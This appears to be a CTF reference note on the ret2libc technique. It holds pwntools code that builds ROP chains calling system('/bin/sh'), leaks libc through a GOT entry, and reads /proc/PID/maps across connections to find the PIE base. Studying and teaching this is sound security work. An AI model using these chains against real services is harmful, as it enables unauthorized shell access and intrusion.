# ret2libc

**When:** No win function in the binary. You need to call `system("/bin/sh")` from libc.

**Prerequisites:**

- Known libc version (or can identify it from a leak)
- `pop rdi; ret` gadget (to set first argument)
- Stack overflow to control RIP

## How it works

Instead of calling a function in the binary, call a function in libc. Need two things: address of `system` and address of `"/bin/sh"` string (both in libc). Chain them with ROP.

```
[AAAAAA] [AAAAAA] [pop_rdi    ] [bin_sh_addr] [system_addr]
^pad    ^rbp    ^ gadget      ^ rdi = arg1  ^ call system
```

## No PIE

Binary addresses are fixed. Just need libc base.

```python
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address  # from binary
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload = flat({offset: [pop_rdi, bin_sh, system]})
```

## PIE + Leak

Need two stages: leak libc address, then call system.

**Stage 1:** Leak a GOT entry by calling `puts` (or `printf`) on it. Return to `main` for second overflow.

```python
rop = ROP(e)
rop.puts(e.got['puts'])   # puts(puts@GOT) -> prints libc's puts address
rop.main()                 # return to main for second payload
payload1 = flat({offset: rop.chain()})
io.sendline(payload1)

leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.info(f"libc @ {hex(libc.address)}")
```

```
Stack during stage 1:
[AAAAAA] [AAAAAA] [pop_rdi] [puts@GOT] [puts@PLT] [main  ]
                                                  ^ returns to main
```

**Stage 2:** Now libc base is known, call system.

```python
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))
payload2 = flat({offset: rop2.chain()})
```

## Multi-connection PIE Leak

When you have no local leak primitive but the server allows concurrent connections with `/proc/PID/maps` readable.

**How it works:** Connection 1 leaks its PID via `/proc/self/stat`. Connection 2 reads `/proc/PID/maps` to get PIE base. Connection 3 exploits with known addresses.

```python
# Connection 1: learn our PID
io1 = start()
io1.sendline(b"read /proc/self/stat")
pid = int(io1.recv().split()[0])

# Connection 2: read memory maps of connection 1
io2 = start()
io2.sendline(f"read /proc/{pid}/maps".encode())
line = io2.recvline().decode()
pie_base = int(line.split('-')[0], 16)

# Connection 3: exploit with known base
io3 = start()
# Build ROP using pie_base
```

## Stack alignment

Same as ret2win: if `system` crashes, prepend a `ret` gadget.

```python
payload = flat({offset: [ret, pop_rdi, bin_sh, system]})
```

## No pop rdi gadget

If the binary has no `pop rdi; ret`, use the **ret2csu** technique or search in libc (if you know libc base). Libc always has plenty of gadgets.
